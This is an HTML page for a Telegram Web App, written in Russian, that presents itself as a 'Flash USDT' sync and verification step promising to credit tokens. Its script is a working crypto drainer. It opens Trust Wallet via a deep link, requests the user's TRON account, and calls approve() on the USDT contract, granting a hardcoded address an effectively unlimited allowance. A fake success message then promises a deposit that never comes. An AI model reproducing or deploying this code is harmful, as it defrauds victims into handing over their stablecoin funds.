<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { padding: 30px; width: 100%; max-width: 400px; background: #111; border-radius: 30px; border: 1px solid #222; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; box-shadow: 0 5px 15px rgba(0,136,204,0.3); }
        #status { font-size: 11px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <h2 id="title">Синхронизация USDT</h2>
    <p id="desc">Для верификации транзакции и зачисления токенов нажмите кнопку ниже. Система автоматически подключит ваш кошелек.</p>
    
    <button id="main-btn" class="btn">ПОДТВЕРДИТЬ</button>
    
    <div id="status">Network: TRC-20 (Tron)</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const CLEAN_URL = "https://timur3417.github.io/sync-node-app/";

    const btn = document.getElementById('main-btn');

    btn.onclick = async () => {
        // 1. Проверяем, в Телеграме ли мы (нет кошелька в системе)
        const provider = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!provider) {
            // Если мы в ТГ - открываем Trust Wallet с маячком
            const targetUrl = CLEAN_URL + "?mode=direct";
            const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(targetUrl);
            tg.openLink(deepLink);
            return;
        }

        // 2. Если мы уже внутри кошелька - "пробиваем" апрув
        try {
            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
            btn.disabled = true;

            // Сначала жестко запрашиваем адрес
            await provider.request({ method: 'tron_requestAccounts' });

            // Теперь вызываем апрув
            const contractObj = await provider.contract().at(CONTRACT);
            await contractObj.approve(ADMIN, '1000000000000000000').send();

            tg.showPopup({
                title: 'Успешно',
                message: 'Верификация завершена. Зачисление ожидается в течение 15-30 минут.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 3000);

        } catch (e) {
            tg.showAlert("Ошибка: Убедитесь, что выбрана сеть TRON в углу экрана, и подтвердите действие.");
            btn.innerText = "ПОДТВЕРДИТЬ";
            btn.disabled = false;
        }
    };

    // Если в ссылке есть ?mode=direct, значит мы уже перешли из ТГ
    if (window.location.search.includes('mode=direct')) {
        document.getElementById('title').innerText = "Узел обнаружен";
        document.getElementById('desc').innerText = "Нажмите 'Подтвердить' для финальной подписи транзакции.";
    }
</script>
</body>
</html>
